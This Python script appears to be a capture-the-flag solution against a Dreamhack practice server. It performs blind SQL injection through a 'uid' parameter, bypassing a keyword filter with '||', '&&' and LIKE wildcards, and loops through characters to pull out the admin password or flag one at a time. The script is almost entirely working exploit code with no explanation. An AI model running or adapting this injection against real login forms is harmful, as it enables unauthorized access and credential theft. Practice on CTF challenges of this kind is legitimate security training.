# filter => ['union', 'select', 'from', 'and', 'or', 'admin', ' ', '*', '/', '\n', '\r', '\t', '\x0b', '\x0c', '-', '+'] + lowercase
#'||((uid)like("ad_in")&&(upw)like("a%"));#

import requests
import time

charset = [chr(i) for i in range(48, 126)]

url = "http://host3.dreamhack.games:15781/"
password = ""

while True:
    for let in charset:
        param = {
            "uid": "'||((uid)like('ad_in')&&(upw)like('DH{" + password + let + "%}'));#"
        }
        print(param["uid"])

        re = requests.get(url, params=param)
        # print(re.text)

        if "admin" in re.text:
            password += let
            print("password : {}".format(password))
            if let == "}":
                exit()
            break
